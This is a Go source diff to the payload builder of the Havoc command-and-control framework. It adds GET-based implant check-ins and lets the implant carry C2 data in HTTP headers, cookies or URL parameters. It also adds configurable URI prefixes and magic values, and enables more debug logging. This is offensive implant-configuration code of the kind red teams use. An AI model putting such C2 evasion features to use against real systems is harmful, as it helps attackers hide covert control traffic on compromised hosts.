@@ -2,7 +2,7 @@ package builder
 
 import (
 	"bytes"
-	//"encoding/hex"
+	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -14,6 +14,7 @@ import (
 	"strconv"
 	"strings"
 
+	"Havoc/pkg/agent"
 	"Havoc/pkg/common"
 	"Havoc/pkg/common/packer"
 	"Havoc/pkg/handlers"
@@ -275,6 +276,7 @@ func (b *Builder) Build() bool {
 	// enable debug mode
 	if b.compilerOptions.Config.DebugDev {
 		b.compilerOptions.Defines = append(b.compilerOptions.Defines, "DEBUG")
+		b.compilerOptions.CFlags[0] += " -mconsole"
 	} else {
 		if b.FileType == FILETYPE_WINDOWS_SERVICE_EXE {
 			b.compilerOptions.CFlags[0] = "-mwindows -ladvapi32"
@@ -480,7 +482,7 @@ func (b *Builder) Build() bool {
 		b.SendConsoleMessage("Info", "compiling source")
 	}
 
-	//logger.Debug(CompileCommand)
+	logger.Debug("CompileCommand: " + CompileCommand)
 	Successful := b.CompileCmd(CompileCommand)
 
 	if Successful {
@@ -940,8 +942,11 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		DemonConfig.AddInt32(WorkingHours)
 
 		if strings.ToLower(Config.Config.Methode) == "get" {
-			//DemonConfig.AddWString("GET")
-			return nil, errors.New("GET method is not supported")
+			loc := strings.ToLower(Config.Config.DataLocation.Location)
+			if loc == "" || loc == "body" {
+				return nil, errors.New("GET method requires a non-body Data Location (header, cookie, or parameter)")
+			}
+			DemonConfig.AddWString("GET")
 		} else {
 			DemonConfig.AddWString("POST")
 		}
@@ -1027,12 +1032,13 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 
 		if len(Config.Config.Uris) == 0 {
 			DemonConfig.AddInt(1)
-			DemonConfig.AddWString("/")
+			DemonConfig.AddWString(Config.Config.UriPrefix + "/")
 		} else {
 			DemonConfig.AddInt(len(Config.Config.Uris))
 			for _, uri := range Config.Config.Uris {
-				logger.Debug(uri)
-				DemonConfig.AddWString(uri)
+				demonUri := Config.Config.UriPrefix + uri
+				logger.Debug(demonUri)
+				DemonConfig.AddWString(demonUri)
 			}
 		}
 
@@ -1046,6 +1052,51 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 			DemonConfig.AddWString(Config.Config.Proxy.Password)
 		} else {
 			DemonConfig.AddInt(win32.FALSE)
+		}
+
+		// data location config (request direction)
+		reqLoc := 0
+		reqName := ""
+		logger.Debug(fmt.Sprintf("DataLocation config: Location=%q Name=%q (config blob size before DataLocation: %d bytes)", Config.Config.DataLocation.Location, Config.Config.DataLocation.Name, DemonConfig.Size()))
+		if Config.Config.DataLocation.Location != "" {
+			switch strings.ToLower(Config.Config.DataLocation.Location) {
+			case "header":
+				reqLoc = 1
+			case "cookie":
+				reqLoc = 2
+			case "parameter":
+				reqLoc = 3
+			}
+			reqName = Config.Config.DataLocation.Name
+		}
+		logger.Debug(fmt.Sprintf("DataLocation serialized: reqLoc=%d reqName=%q", reqLoc, reqName))
+		DemonConfig.AddInt(reqLoc)
+		DemonConfig.AddWString(reqName)
+
+		// data location config (response direction) — defaults to body, NOT inherited from request
+		respLoc := 0
+		respName := ""
+		if Config.Config.Response.DataLocation.Location != "" {
+			switch strings.ToLower(Config.Config.Response.DataLocation.Location) {
+			case "header":
+				respLoc = 1
+			case "cookie":
+				respLoc = 2
+			case "parameter":
+				respLoc = 3
+			default:
+				respLoc = 0
+			}
+			respName = Config.Config.Response.DataLocation.Name
+		}
+		DemonConfig.AddInt(respLoc)
+		DemonConfig.AddWString(respName)
+
+		// magic value (default 0xDEADBEEF)
+		if Config.Config.MagicValue != 0 {
+			DemonConfig.AddInt(int(Config.Config.MagicValue))
+		} else {
+			DemonConfig.AddInt(int(agent.DEMON_MAGIC_VALUE))
 		}
 
 		break
@@ -1068,7 +1119,7 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		break
 	}
 
-	//logger.Debug("DemonConfig:\n" + hex.Dump(DemonConfig.Buffer()))
+	logger.Debug("DemonConfig:\n" + hex.Dump(DemonConfig.Buffer()))
 
 	return DemonConfig.Buffer(), nil
 }
